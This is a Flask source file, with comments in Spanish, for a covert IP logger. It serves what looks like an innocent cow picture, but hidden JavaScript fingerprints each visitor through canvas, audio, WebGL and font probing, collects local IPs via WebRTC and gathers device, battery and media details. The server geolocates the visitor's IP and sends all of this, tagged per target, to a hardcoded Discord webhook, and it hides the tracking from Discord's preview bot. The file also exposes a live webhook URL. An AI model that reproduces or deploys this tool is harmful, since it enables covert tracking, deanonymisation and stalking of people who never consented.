from flask import Flask, request, Response, jsonify
from datetime import datetime
import json
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1563012196504436879/wU6hemm8vVllEETqQDCLJ5NbpYTtQvA96E-KM9QCM-uEMBd9a6ARcOEzIHmVrc89b5Ti"
COW_IMAGE = "https://upload.wikimedia.org/wikipedia/commons/0/0c/Cow_female_black_white.jpg"


def client_ip():
    # La IP real del cliente es siempre la PRIMERA de X-Forwarded-For
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        ip = xff.split(",")[0].strip()
    else:
        ip = (request.headers.get("CF-Connecting-IP")
              or request.headers.get("X-Real-IP")
              or request.remote_addr or "")
    ip = ip.strip()
    if ip.startswith("::ffff:"):   # IPv4 mapeada en IPv6
        ip = ip[7:]
    return ip


def geo(ip):
    try:
        return requests.get(
            "http://ip-api.com/json/" + ip +
            "?fields=status,country,regionName,city,zip,lat,lon,timezone,"
            "isp,org,as,proxy,hosting,mobile",
            timeout=5).json()
    except Exception:
        return {}


def post(embed):
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=6)
    except Exception:
        pass


def fld(name, value):
    value = str(value).strip() if value not in (None, "") else "N/D"
    return {"name": name, "value": value[:1020], "inline": False}


PAGE = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>mira</title>
<style>
  html,body{margin:0;height:100%;background:#0d0d0d;}
  body{display:flex;align-items:center;justify-content:center;}
  img{max-width:100%;max-height:100vh;}
</style>
</head>
<body>
<img src="__COW__" alt="vaca">
<script>
const TAG = __TAG__;
const H = s => { let h = 0; for (let i = 0; i < s.length; i++) { h = (h << 5) - h + s.charCodeAt(i); h |= 0; } return (h >>> 0).toString(16); };

function canvasFP() {
  try {
    const c = document.createElement("canvas");
    c.width = 260; c.height = 60;
    const x = c.getContext("2d");
    x.textBaseline = "top";
    x.font = "14px Arial";
    x.fillStyle = "#f60"; x.fillRect(0, 0, 130, 30);
    x.fillStyle = "#069"; x.fillText("Vaca 1234 xyz", 2, 15);
    x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("Vaca 1234 xyz", 4, 17);
    return H(c.toDataURL());
  } catch (e) { return null; }
}

function webgl() {
  const o = {};
  try {
    const gl = document.createElement("canvas").getContext("webgl");
    if (!gl) return o;
    const d = gl.getExtension("WEBGL_debug_renderer_info");
    if (d) o.gpu = gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + " / " + gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
    o.maxTex = gl.getParameter(gl.MAX_TEXTURE_SIZE);
    o.exts = (gl.getSupportedExtensions() || []).length;
  } catch (e) {}
  return o;
}

function fonts() {
  try {
    const base = ["monospace", "sans-serif", "serif"];
    const test = ["Arial","Arial Black","Calibri","Cambria","Comic Sans MS","Consolas","Courier New","Georgia","Helvetica","Impact","Lucida Console","Palatino Linotype","Segoe UI","Tahoma","Times New Roman","Trebuchet MS","Verdana","Webdings","Wingdings","Roboto","Ubuntu","Cantarell","DejaVu Sans","Noto Sans","Menlo","Monaco"];
    const s = document.createElement("span");
    s.style.cssText = "position:absolute;left:-9999px;font-size:72px;white-space:nowrap;";
    s.textContent = "mmmmmmmmmmlli";
    document.body.appendChild(s);
    const bw = {};
    for (const b of base) { s.style.fontFamily = b; bw[b] = s.offsetWidth; }
    const found = [];
    for (const ft of test) {
      let ok = false;
      for (const b of base) {
        s.style.fontFamily = "'" + ft + "'," + b;
        if (s.offsetWidth !== bw[b]) { ok = true; break; }
      }
      if (ok) found.push(ft);
    }
    s.remove();
    return found.join(", ");
  } catch (e) { return null; }
}

async function audioFP() {
  try {
    const C = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    const ctx = new C(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
    comp.attack.value = 0; comp.release.value = 0.25;
    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
    const buf = await ctx.startRendering();
    let sum = 0; const ch = buf.getChannelData(0);
    for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
    return sum.toFixed(6);
  } catch (e) { return null; }
}

function localIPs() {
  return new Promise(res => {
    const set = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("x");
      pc.onicecandidate = e => {
        if (!e.candidate) { try { pc.close(); } catch (_) {} return res([...set]); }
        const m = /([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
        if (m) set.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => res([...set]), 1800);
    } catch (e) { res([]); }
  });
}

async function main() {
  const d = {}, n = navigator;
  d.ua = n.userAgent;
  d.platform = n.platform;
  d.lang = n.language;
  d.langs = (n.languages || []).join(", ");
  d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  d.tzOffset = new Date().getTimezoneOffset();
  d.screen = screen.width + "x" + screen.height;
  d.avail = screen.availWidth + "x" + screen.availHeight;
  d.win = innerWidth + "x" + innerHeight;
  d.depth = screen.colorDepth;
  d.dpr = devicePixelRatio;
  d.cores = n.hardwareConcurrency;
  d.mem = n.deviceMemory;
  d.touch = n.maxTouchPoints;
  d.cookies = n.cookieEnabled;
  d.dnt = n.doNotTrack;
  d.pdf = n.pdfViewerEnabled;
  d.bot = n.webdriver;
  d.plugins = n.plugins ? [...n.plugins].map(p => p.name).join(", ") : "";
  d.scheme = matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
  d.motion = matchMedia("(prefers-reduced-motion: reduce)").matches;
  d.canvas = canvasFP();
  Object.assign(d, webgl());
  d.fonts = fonts();
  d.audio = await audioFP();
  d.local = (await localIPs()).join(", ");
  if (n.connection) { d.net = n.connection.effectiveType; d.down = n.connection.downlink; d.rtt = n.connection.rtt; d.save = n.connection.saveData; }
  try {
    const devs = await n.mediaDevices.enumerateDevices();
    d.cams = devs.filter(x => x.kind === "videoinput").length;
    d.mics = devs.filter(x => x.kind === "audioinput").length;
    d.spk = devs.filter(x => x.kind === "audiooutput").length;
  } catch (e) {}
  if (n.getBattery) { try { const b = await n.getBattery(); d.bat = Math.round(b.level * 100) + "%" + (b.charging ? " cargando" : ""); } catch (e) {} }
  if (n.storage && n.storage.estimate) { try { const e = await n.storage.estimate(); d.storage = (e.quota / 1e9).toFixed(1) + " GB"; } catch (e) {} }
  if (n.userAgentData) {
    try {
      const h = await n.userAgentData.getHighEntropyValues(["platform","platformVersion","architecture","bitness","model","uaFullVersion"]);
      d.pver = h.platformVersion; d.arch = h.architecture; d.bits = h.bitness; d.model = h.model;
    } catch (e) {}
    d.mobile = n.userAgentData.mobile;
  }
  d.hash = H(JSON.stringify([d.canvas, d.audio, d.fonts, d.gpu, d.screen, d.tz, d.platform, d.cores, d.mem, d.ua]));
  fetch("/fp", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ tag: TAG, data: d }) });
}
main();
</script>
</body>
</html>"""


@app.route("/")
def index():
    ua = request.headers.get("User-Agent", "")
    tag = request.args.get("u", "")

    if "discordbot" not in ua.lower():          # el bot de Discord no cuenta como visita
        ip = client_ip()
        g = geo(ip)
        flags = ", ".join(k for k in ("proxy", "hosting", "mobile") if g.get(k)) or "ninguna"
        post({
            "title": f"IP: {ip}",
            "color": 5763719,
            "description": f"**Quien:** {tag or 'desconocido'}\n**Fecha:** {datetime.now():%Y-%m-%d %H:%M:%S}",
            "fields": [
                fld("Ubicacion", f"{g.get('country','')} / {g.get('regionName','')} / {g.get('city','')} {g.get('zip','')} | {g.get('lat','')}, {g.get('lon','')} | {g.get('timezone','')}"),
                fld("Red", f"ISP: {g.get('isp','')} | Org: {g.get('org','')} | AS: {g.get('as','')} | flags: {flags}"),
                fld("Headers", f"UA: {ua[:180]}\nLang: {request.headers.get('Accept-Language','')}\nRef: {request.headers.get('Referer','')}"),
            ],
        })

    page = PAGE.replace("__COW__", COW_IMAGE).replace("__TAG__", json.dumps(tag))
    r = Response(page, mimetype="text/html")
    r.headers["Cache-Control"] = "no-store"
    return r


@app.route("/fp", methods=["POST"])
def fp():
    p = request.get_json(silent=True) or {}
    d = p.get("data", {}) or {}
    tag = p.get("tag", "")
    ip = client_ip()

    def v(k):
        return str(d.get(k)) if d.get(k) not in (None, "") else "N/D"

    post({
        "title": f"Dispositivo de {tag or ip}",
        "color": 3066993,
        "description": f"IP: `{ip}`",
        "fields": [
            fld("Sistema", f"{v('platform')} | v{v('pver')} | {v('arch')} {v('bits')} | movil: {v('mobile')} | modelo: {v('model')}"),
            fld("Pantalla", f"{v('screen')} (disp {v('avail')}) | ventana {v('win')} | {v('depth')} bits | DPR {v('dpr')} | tema {v('scheme')}"),
            fld("Hardware", f"CPU {v('cores')} nucleos | RAM {v('mem')} GB | GPU {v('gpu')} | maxTex {v('maxTex')} | touch {v('touch')}"),
            fld("Huellas", f"canvas {v('canvas')} | audio {v('audio')} | hash {v('hash')}"),
            fld("Fuentes", v('fonts')),
            fld("Media", f"camaras {v('cams')} | mics {v('mics')} | salidas {v('spk')}"),
            fld("Red", f"tipo {v('net')} | down {v('down')} Mbps | rtt {v('rtt')} ms | ahorro {v('save')} | IP local {v('local')}"),
            fld("Idiomas", f"{v('lang')} | {v('langs')}"),
            fld("Zona horaria", f"{v('tz')} (offset {v('tzOffset')})"),
            fld("Extras", f"bateria {v('bat')} | storage {v('storage')} | cookies {v('cookies')} | DNT {v('dnt')} | webdriver {v('bot')} | motion {v('motion')}"),
            fld("Plugins", v('plugins')),
            fld("User-Agent", v('ua')),
        ],
    })
    return jsonify({"ok": True})


@app.route("/favicon.ico")
def favicon():
    return Response(status=204)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
